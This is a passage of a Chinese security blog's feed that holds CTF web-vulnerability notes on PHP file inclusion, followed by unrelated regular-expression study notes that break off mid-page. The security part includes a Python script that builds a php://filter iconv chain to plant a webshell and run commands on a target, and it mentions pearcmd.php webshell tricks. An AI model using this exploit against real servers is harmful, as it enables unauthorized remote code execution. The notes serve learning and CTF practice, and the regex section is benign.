curl实现发送get和post请求 - 简书 (jianshu.com)</a></p><h2 id="phar文件包含"><a href="#phar文件包含" class="headerlink" title="phar文件包含"></a>phar文件包含</h2><p>详情、例题请看php反序列化内笔记。</p><h2 id="PHP7卡临时文件包含"><a href="#PHP7卡临时文件包含" class="headerlink" title="PHP7卡临时文件包含"></a>PHP7卡临时文件包含</h2><p><a href="https://blog.csdn.net/qq_62989306/article/details/125114940">https://blog.csdn.net/qq_62989306/article/details/125114940</a></p><h2 id="LFI-RCE"><a href="#LFI-RCE" class="headerlink" title="LFI RCE"></a>LFI RCE</h2><p><a href="https://articles.zsxq.com/id_wx85v4auoqam.html">https://articles.zsxq.com/id_wx85v4auoqam.html</a></p><ol><li>利用pearcmd.php，在tmp或者某可写目录下面生成一个webshell然后包含导致rce</li></ol><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p><ol><li>利用php://filter/的各种编码直接rce</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数file</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.190.191/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">file_to_use = <span class="string">&quot;index&quot;</span></span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line"></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span></span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line"></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line"></span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line"></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line"></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line"></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final_payload)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line"></span><br><span class="line">    \<span class="comment">#&quot;action&quot;: &quot;include&quot;,</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习正则表达式的一些笔记</title>
      <link href="/posts/628b.html"/>
      <url>/posts/628b.html</url>
      
        <content type="html"><![CDATA[<h1 id="学习正则表达式的一些笔记"><a href="#学习正则表达式的一些笔记" class="headerlink" title="学习正则表达式的一些笔记"></a>学习正则表达式的一些笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>emmm虽然正则表达式好像不是特别急需，但后面还是需要学的=-=，就在吃喝玩乐睡的假期抽空学习一下。 本章是阅读《正则表达式30分钟入门》的笔记</p><h2 id="界定符"><a href="#界定符" class="headerlink" title="界定符"></a>界定符</h2><p>指定正则表达式的开始和结束，可以当成是计算机语言中的大括号<code>&#123;</code>和<code>&#125;</code>。一般有三种表现方式：</p><ul><li>斜杠。例如<code>/[0-9]/</code>。这是最常用的方式，在PHP中，推荐使用这种方式。</li><li>井号。例如<code>#[0-9]</code>。</li><li>大括号。例如<code>&#123;[0-9]&#125;</code>。在正则表达式中，大括号还有其他作用，所以这种方式不推荐使用。</li></ul><h2 id="修饰符-修正模式"><a href="#修饰符-修正模式" class="headerlink" title="修饰符 | 修正模式"></a>修饰符 | 修正模式</h2><p>给正则表达式的匹配过程添加一种匹配模式，一般加在屁股比如：<code>/[a-z]/i</code></p><ul><li><code>U</code> 加<code>U</code>是懒惰匹配，不加<code>U</code>是默认的贪婪匹配。</li><li><code>i</code> 忽略英文字母大小写。</li><li><code>x</code> 忽略空白。（包括空格和按tab键输出的制表符）</li><li><code>s</code> 让元字符<code>.</code>匹配包括换行符在内的所有字符。</li><li><code>A</code>强制从目标字符串开头匹配</li><li><code>e</code> <code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。简单的说，就是PHP会把replace的结果当做PHP代码。（替换字符串要符合php的语法规范） 例如：<code>echo preg_replace(&#39;/(\d+),(\d+)/e&#39;, &#39;$1+$2&#39;, &#39;2,3&#39;);</code>会输出<code>5</code></li><li><code>g</code>全局匹配(但只匹单行) 若不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功并返回 若带g，则字符串从左到右，找到每个符合条件的都记录下来，直到字符串结尾位置</li><li><code>m</code>多行匹配：若存在换行<code>\n</code>并且有开始<code>^</code>或结束<code>$</code>符的情况下，和<code>g</code>一起使用实现全局匹配。 存在换行时默认会把换行符作为一个字符任务匹配。 g只匹配第一行，添加m之后实现多行，每个换行符之后作为新的匹配起始</li></ul><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p><code>.</code> ：匹配除换行符以外的任意字符 <code>\w</code>：匹配字母或数字或下划线或汉字等 <code>\s</code>：匹配任意的空白符，包括空格，制表符(Tab)，换行符，中文全角空格 等 <code>\d</code>：匹配一位数字 <code>\b</code>：匹配单词的开始或结束。匹配这样一个位置：它的前一个字符和后一个字符不全是\w（一个是，一个不是或不存在） <code>^</code>：匹配字符串开始 <code>$</code>：匹配字符串结束 <code>(</code>和<code>)</code>：小括号有很多妙用，看下面吧</p><h2 id="反义"><a href="#反义" class="headerlink" title="反义"></a>反义</h2><p><code>\W</code> 匹配任意不是字母，数字，下划线，汉字的字符 <code>\S</code> 匹配任意不是空白符的字符 <code>\D</code> 匹配任意非数字的字符 <code>\B</code> 匹配不是单词开头或结束的位置 <code>[\^x]</code> 匹配除了x以外的任意字符 <code>[\^aeiou]</code> 匹配除了aeiou这几个字母以外的任意字符</p><h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><p><code>*</code> ：任意数量；重复0次或很多次 <code>+</code>：&gt;=1次；重复1次或很多次 <code>?</code>：0 or 1；重复0次或1次 <code>&#123;n&#125;</code>：n次；如：\d{2}（表示\d重复匹配2次）； <code>&#123;n,&#125;</code>：&gt;=n次；重复n次或更多次 <code>&#123;n,m&#125;</code>：重复n到m次；重复次数不少于n，不大于m</p><h2 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h2><p>若需要查找元字符本身如<code>.</code>、<code>*</code>这些，需要用<code>\</code>来将这些字符的特殊意义取消掉：如<code>\.</code>、<code>\*</code>；当然查找<code>\</code>本身也需要转义为<code>\\</code></p><h2 id="正则表达式字符类备忘单"><a href="#正则表达式字符类备忘单" class="headerlink" title="正则表达式字符类备忘单"></a>正则表达式字符类备忘单</h2><p>打ctf的时候碰到的正则匹配 ps：不过这个好像不是所有语言都适用？在使用正则测试小工具测试payload的时候就没能识别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[:alpha:]`任意字母, `[A-Za-z]` `[:upper:]`任意大写字母, `[A-Z]` `[:lower:]`任意小写字母, `[a-z]` `[:digit:]`任意数字, `[0-9]` `[:alnum:]`任意字符字母数字, `[A-Za-z0-9]` `[:xdigit:]`任意十六进制数字, `[0-9A-Fa-f]` `[:space:]`制表符，换行符，垂直制表符，换页，回车或空格 `[:blank:]`空格或制表符 `[:print:]`任意可打印字符 `[:punct:]`任意标点符号: `! &#x27; # S % &amp; &#x27; ( ) * + , - . / : ; &lt; = &gt; ? @ [ / ] ^ _ &#123; | &#125; ~` `[:graph:]`除space类之外的任意字符 `[:word:]`字母数字字符和下划线的连续字符串 `[:ascii:]`ASCII字符，范围：0-127 `[:cntrl:]`任何不属于字符类的字符: `[:upper:], [:lower:], [:alpha:], [:digit:], [:punct:], [:graph:], [:print:], [:xdigit:]</span><br></pre></td></tr></table></figure><h2 id="查找字符类"><a href="#查找字符类" class="headerlink" title="查找字符类"></a>查找字符类</h2><p>如查找abcde，只需在方括号中列出<code>[abcde]</code>;那么就构造了这样一个只会匹配abcde的字符集，数量由其后的重复次数决定</p><p>也可以指定范围： [0-9] 代表的含意与 \d 就是完全一致的：一位 数字； [a-z0-9A-Z_] 也完全等同于 \w （如果只考虑英文的话）。</p><h2 id="分支条件"><a href="#分支条件" class="headerlink" title="分支条件"></a>分支条件</h2><p>正则表达式里的分枝条件指的是有几种规则，如果满足其中任意一种规则都会进行匹配，具体方法是用 <code>|</code> 把不同的规则分隔开。如a | b，只要满足其中之一，都会进行匹配</p><h2 id="分组-子表达式"><a href="#分组-子表达式" class="headerlink" title="分组(子表达式)"></a>分组(子表达式)</h2><p>想要重复多个字符时，需要先用小括号进行分组，然后再指定这个分组的重复次数。 eg： <code>(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;</code> 是一个简单的 IP 地址匹配表达式。 按下列顺序分析它： <code>\d&#123;1,3&#125;</code>匹配 1到3位的数字， <code>(\d&#123;1,3&#125;\.)&#123;3&#125;</code>匹配三位数字加上一个英文句号(这个整体也就是这个分组) 重复3次， 最后再加上一个一到三位的数字 <code>(\d&#123;1,3&#125;)</code> 。</p><p>IP地址中每个数字都不能大于255 且 01.02.03.04 这样前面带有0的数字, 也是正确的IP地址，IP 地址里的数字可以包含有前导 0 (leading zeroes). 不过上述正则表达式也会匹配 256.300.888.999 这种不可能存在的IP地址。 如果能使用算术比较的话，或许能简单地解决这个问题，但是正则表达式中并不提供关于数学的任何功能 所以只能使用冗长的分组，选择，字符类来描述一个正确的IP地址： <code>((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)</code></p><p>理解这个表达式的关键是理解 <code>2[0-4]\d|25[0-5]|[01]?\d\d?</code></p><p>解析：分成三部分：<code>2[0-4]\d</code>、<code>25[0-5]</code>、<code>[01]?\d\d?</code> <code>2[0-4]\d</code>：<strong>2</strong> + <strong>[0-4]中的任一个</strong> + <strong>任意数字</strong>；即：200-209、210-219、220-229、230-239、240-249 <code>25[0-5]：</code>：<strong>25</strong> + <strong>[0-5]任一个</strong>；即：250-255 <code>[01]?\d\d?：</code>：<strong>[01]?</strong> + <strong>\d</strong> + <strong>\d?</strong>;即0/1(不匹配或匹配1次)，加上任一数字，加上任一数字(不匹配或匹配1次)</p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>使用小括号指定一个子表达式后，匹配这个子表达式的文本(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。 也就是说可以对分组匹配到的文字进行处理</p><p>默认情况下，每个分组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。</p><p>后向引用用于重复搜索前面某个分组匹配的文本。 例如： <code>\1</code> 代表分组1匹配的文本。 示例： <code>\b(\w+)\b\s+\1\b</code> 就可以可以用来匹配重复的单词，像go go, 或者kitty kitty。</p><p>解析： <code>(\b(\w+)\b)</code> :首先是一个单词（这个单词会被捕获到编号为1的分组中），也就是单词开始处和结束处之间数量多于一个的字母或数字 <code>(\s+)</code> ：然后是1个或几个空白符 <code>(\1)</code> ：最后是分组1中捕获的内容（也就是前面匹配的那个单词）</p><h3 id="自定义子表达式的组名"><a href="#自定义子表达式的组名" class="headerlink" title="自定义子表达式的组名"></a>自定义子表达式的组名</h3><p>子表达式的组名也可以自己定义：</p><p>使用语法形如： <code>(? &lt;Word&gt;\w+)</code> (或者把尖括号换成’也行： <code>(?&#39;Word&#39;\w+)</code>) 这样就把 <code>\w+</code> 的组名指定为 <code>Word</code> 了。</p><p>反向引用时：<code>\k&lt;Word&gt;</code></p><p>由此可以将上面的例子<code>\b(\w+)\b\s+\1\b</code>写为<code>\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b</code></p><h3 id="使用-的一些常用的特定语法"><a href="#使用-的一些常用的特定语法" class="headerlink" title="使用 () 的一些常用的特定语法"></a>使用 () 的一些常用的特定语法</h3><div class="table-container"><table><thead><tr><th>分类</th><th>代码<strong>/</strong>语法</th><th>说明</th></tr></thead><tbody><tr><td>捕获</td><td>(exp)</td><td>匹配exp,并捕获文本到<strong>自动命名</strong>的组里</td></tr><tr><td></td><td>(?exp) or (?’name’exp)</td><td>匹配exp,并捕获文本到名称为name的组里</td></tr><tr><td></td><td>(?:exp)</td><td>匹配exp,<strong>不捕获</strong>匹配的文本，也<strong>不给此分组分配组号</strong></td></tr><tr><td>零宽断言</td><td>(?=exp)</td><td>匹配<strong>exp前面</strong>的位置</td></tr><tr><td></td><td>(?&lt;=exp)</td><td>匹配<strong>exp后面</strong>的位置</td></tr><tr><td></td><td>(?!exp)</td><td>匹配<strong>后面</strong>跟的<strong>不是exp</strong>的位置</td></tr><tr><td></td><td>(?&lt;!exp)</td><td>匹配<strong>前面不是exp</strong>的位置</td></tr><tr><td>注释</td><td>(?#comment)</td><td>这种类型的分组不对正则表达式的处理产生任何影响，用于<strong>提供注释</strong>让人阅读</td></tr></tbody></table></div><h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>就是用于查找在某些内容(不包括这些内容)之前或之后的东西，即指定内容前/后的位置，并且该位置需满足一定条件（断言）；故综合称之为零宽断言。</p><p><code>(?=exp)</code>（零宽度<strong>正</strong>预测<strong>先行</strong>断言）：断言自身出现的位置的<strong>后面</strong>能匹配表达式exp</p><blockquote><p>比如：<code>\b\w+(?=ing\b)</code>，匹配<strong>以ing结尾</strong>的单词的前面部分(<strong>除了ing以外的部分</strong>)，</p><p>如查找<em>I’m singing while you’re dancing.</em>时，它会匹配<strong>sing</strong>和<strong>danc</strong>。</p></blockquote><p><code>(?&lt;=exp)</code>（零宽度<strong>正</strong>回顾<strong>后发</strong>断言）：断言自身出现的位置的<strong>前面</strong>能匹配表达式 exp</p><blockquote><p>比如：<code>(?&lt;=\bre)\w+\b</code>会匹配<strong>以re开头</strong>的单词的后半部分(<strong>除了re以外的部分</strong>)，</p><p>例如在查找<em>reading a book</em>时，它匹配<strong>ading</strong>。</p></blockquote><h2 id="负向零宽断言"><a href="#负向零宽断言" class="headerlink" title="负向零宽断言"></a>负向零宽断言</h2><p><code>(?!exp)</code>（零宽度<strong>负</strong>预测<strong>先行</strong>断言）：断言此位置的<strong>后面不能匹配</strong>表达式exp</p><blockquote><p>比如：</p><p><code>\d&#123;3&#125;(?!\d)</code>匹配三位数字，而且这三位数字的后面不能是数字；</p><p><code>\b((?!abc)\w)+\b</code>匹配不包含连续字符串abc的单词。</p></blockquote><p><code>(?&lt;!exp)</code>（零宽度<strong>负</strong>回顾<strong>后发</strong>断言）：断言此位置的<strong>前面不能匹配</strong>表达式exp</p><blockquote><p>比如：</p><p><code>(?&lt;![a-z])\d&#123;7&#125;</code>匹配前面不是小写字母的七位数字。</p><p><code>(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</code>匹配不包含属性的简单HTML标签内里的内容</p><p>解析： <code>(?&lt;=&lt;(\w+)&gt;)</code>指定了<strong>前缀</strong>：被尖括号括起来的单词(比如可能是<code>&lt;b&gt;</code>)， <code>.</code> <code>*</code>(任意的字符串),最后是一个<strong>后缀</strong><code>(?=&lt;\/\1&gt;)</code>。 后缀里的<code>\/</code>用到了前面提过的字符转义； <code>\1</code>是一个反向引用，引用捕获的第一组，前面 <code>(\w+)</code> 匹配的内容</p><p>这样如果前缀实际上是 <code>&lt;b&gt;</code> 的话，后缀就是 <code>&lt;/b&gt;</code> 了。</p><p>整个表达式匹配的是 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code> 之间的内容(不包括前缀和后缀本身)。</p></blockquote><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释<a href="https://na0h.cn/笔记/学习正则表达式的一些笔记#注释"></a></h2><p>通过语法<code>(?#comment)</code>来包含注释</p><blockquote><p>比如：<code>2[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199)</code></p></blockquote><p>要包含注释的话，最好是启用“忽略模式里的空白符”选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。 启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。</p><p>例如，我们可以将前面的一个表达式写成这样：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(?&lt;=    # 断言要匹配的文本的前缀</span><br><span class="line">&lt;(\w+)&gt; # 查找尖括号括起来的内容</span><br><span class="line">        # (即HTML/XML标签)</span><br><span class="line">)       # 前缀结束</span><br><span class="line">.*      # 匹配任意文本</span><br><span class="line">(?=     # 断言要匹配的文本的后缀</span><br><span class="line">&lt;\/\1&gt;  # 查找尖括号括起来的内容</span><br><span class="line">        # 查找尖括号括起来的内容</span><br><span class="line">)       # 后缀结束</span><br></pre></td></tr></table></figure><h2 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h2><h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><p>当正则表达式中包含能接受重复的限定符时，通常的行为是匹配尽可能多的字符（在使整个表达式能得到匹配的前提下）</p><p>如：<code>a.*b</code>会匹配最长的 以a开始，b结束 的字符串； 当以此对aabab进行搜索，就会匹配整个字符串aabab</p><h3 id="懒惰匹配"><a href="#懒惰匹配" class="headerlink" title="懒惰匹配"></a>懒惰匹配</h3><p>也就是是匹配尽可能少的字符。 只需在限定符后加上<code>?</code>即可转换为懒惰匹配模式</p><p>如<code>a.*?b</code>匹配最短的 以a开始，b结束 的字符串； 当以此对aabab进行搜索，就会匹配aab和ab</p><h4 id="懒惰限定符："><a href="#懒惰限定符：" class="headerlink" title="懒惰限定符："></a>懒惰限定符：</h4><div class="table-container"><table><thead><tr><th>代码<strong>/</strong>语法</th><th>说明</th></tr></thead><tbody><tr><td>*?</td><td>重复任意次，但尽可能少重复</td></tr><tr><td>+?</td><td>重复1次或更多次，但尽可能少重复</td></tr><tr><td>??</td><td>重复0次或1次，但尽可能少重复</td></tr><tr><td>{n,m}?</td><td>重复n到m次，但尽可能少重复</td></tr><tr><td>{n,}?</td><td>重复n次以上，但尽可能少重复</td></tr></tbody></table></div><h2 id="处理选项（基于python）"><a href="#处理选项（基于python）" class="headerlink" title="处理选项（基于python）"></a>处理选项（基于python）</h2><p>Python 中常用的正则表达式选项（用到re模块！）：</p><div class="table-container"><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>re.IGNORECASE</td><td>匹配时不区分大小写。</td></tr><tr><td>re.MULTILINE</td><td>更改\^和$的含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。(在此模式下,$的精确含意是:匹配\n之前的位置以及字符串结束前的位置.)</td></tr><tr><td>re.DOTALL</td><td>更改.的含义，使它与每一个字符匹配（包括换行符\n）。</td></tr><tr><td>re.VERBOSE</td><td>忽略表达式中的非转义空白并启用由#标记的注释。</td></tr><tr><td>re.DEBUG</td><td>显示编译表达式的 debug 信息</td></tr></tbody></table></div><h2 id="平衡组-amp-递归匹配"><a href="#平衡组-amp-递归匹配" class="headerlink" title="平衡组&amp;递归匹配"></a>平衡组&amp;递归匹配</h2><p><strong>使用场景</strong>：匹配嵌套字符串，如匹配类中的大括号，HTML中的尖括号等</p><p><code>(?&#39;group&#39;)</code> 把捕获的内容命名为group,并压入堆栈(Stack)</p><p><code>(?&#39;-group&#39;)</code> 从堆栈上弹出最后压入堆栈的名为group的捕获内容，如果堆栈本来为空，则本分组的匹配失败</p><p><code>(?(group)yes|no)</code> 如果堆栈上存在以名为group的捕获内容的话，继续匹配yes部分的表达式，否则继续匹配no部分</p><p><code>(?!)</code> 零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败</p><p>我们要做的是：</p><p>每碰到了左括号，就在压入一个”Open”, 每碰到一个右括号，就弹出一个，到了最后就看看堆栈是否为空；</p><p>不为空 -》证明左括号比右括号多，那匹配就应该失败。</p><p>正则表达式引擎会进行回溯(放弃最前面或最后面的一些字符)，尽量使整个表达式得到匹配</p><h2 id="正则表达式手册"><a href="#正则表达式手册" class="headerlink" title="正则表达式手册"></a>正则表达式手册</h2><h3 id="表达式全集"><a href="#表达式全集" class="headerlink" title="表达式全集"></a>表达式全集</h3><div 